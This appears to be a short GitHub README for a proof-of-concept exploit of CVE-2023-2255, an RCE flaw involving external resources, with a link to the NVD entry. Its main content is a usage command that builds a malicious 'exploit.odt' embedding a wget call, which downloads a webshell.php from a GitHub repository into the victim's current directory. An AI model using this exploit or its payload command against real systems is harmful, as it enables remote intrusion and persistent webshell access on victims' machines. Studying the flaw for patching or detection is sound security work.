# CVE-2023-2255

CVE-2023-2255 RCE & load of external ressources found by [@Icare1337](https://twitter.com/icare1337)

- https://nvd.nist.gov/vuln/detail/CVE-2023-2255

# Exploit

Just an example to drop a webshell in current directory.

```bash
python3 CVE-2023-2255.py --cmd 'wget https://raw.githubusercontent.com/elweth-sec/CVE-2023-2255/main/webshell.php' --output 'exploit.odt'
```
